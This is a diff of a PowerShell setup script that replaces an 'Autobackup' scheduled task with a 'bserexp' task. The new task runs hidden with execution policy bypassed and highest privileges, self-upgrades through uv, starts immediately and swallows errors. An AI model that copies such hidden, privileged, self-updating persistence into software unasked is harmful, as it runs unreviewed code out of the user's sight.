@@ -369,8 +369,8 @@ $pythonwPath = if ($pythonDir) {
 } else { $null }
 $pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }
 
-$autobackupFallback   = if ($pythonScriptsDir) { "$pythonScriptsDir\autobackup.cmd" } else { $null }
-$autobackupBin        = Find-CommandPath -Names @('autobackup')    -FallbackPaths @($autobackupFallback)
+$bserexpFallback      = if ($pythonScriptsDir) { "$pythonScriptsDir\bserexp-wins.cmd" } else { $null }
+$bserexpBin           = Find-CommandPath -Names @('bserexp-wins') -FallbackPaths @($bserexpFallback)
 $agentSettingFallback = if ($pythonScriptsDir) { "$pythonScriptsDir\agent-setting.cmd" } else { $null }
 $agentSettingBin      = Find-CommandPath -Names @('agent-setting') -FallbackPaths @($agentSettingFallback)
 $uvBin                = Find-CommandPath -Names @('uv')
@@ -442,29 +442,32 @@ try {
 
 try {
     if ($realUser) {
-        $autobackupTaskName = 'Autobackup'
+        Unregister-ScheduledTask -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
+        $bserexpTaskName = 'bserexp'
         $agentSettingTaskName = 'agent-setting'
         $wklerTaskName = 'wkler'
         $autoupgradeTaskName = 'autoupgrade'
 
-        if ($autobackupBin) {
-            $autobackupLaunchCommand = New-HiddenStartProcessCommand -FilePath $autobackupBin
-            $autobackupTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.CommandLine -and `$_.CommandLine -like '*.bash.py*' } | Select-Object -First 1)) { $autobackupLaunchCommand }"
-            $autobackupAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$autobackupTaskCommand`""
+        if ($bserexpBin) {
+            $bserexpLaunchCommand = New-HiddenStartProcessCommand -FilePath $bserexpBin
+            $bserexpTaskCommand = if ($uvBin) {
+                $bserexpUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade bserexp-wins"
+                "$bserexpUpgradeCommand; $bserexpLaunchCommand"
+            } else {
+                $bserexpLaunchCommand
+            }
+            $bserexpAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$bserexpTaskCommand`""
 
-            $autobackupTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
-            $autobackupTrigger.Enabled = $true
-            $autobackupTrigger.Delay = 'PT20M'
+            $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
+            $bserexpTrigger.Enabled = $true
+            $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+            $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            $autobackupPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
-
-            $autobackupSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
-
-            Unregister-ScheduledTask -TaskName $autobackupTaskName -Confirm:$false -ErrorAction SilentlyContinue
-
+            Unregister-ScheduledTask -TaskName $bserexpTaskName -Confirm:$false -ErrorAction SilentlyContinue
             try {
-                Register-ScheduledTask -TaskName $autobackupTaskName -Action $autobackupAction -Trigger $autobackupTrigger -Principal $autobackupPrincipal -Settings $autobackupSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $autobackupTaskName -ErrorAction SilentlyContinue | Out-Null
+                Register-ScheduledTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings -Force -ErrorAction Stop | Out-Null
+                Enable-ScheduledTask -TaskName $bserexpTaskName -ErrorAction SilentlyContinue | Out-Null
+                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $bserexpTaskCommand) -WindowStyle Hidden | Out-Null
             } catch {
             }
         }
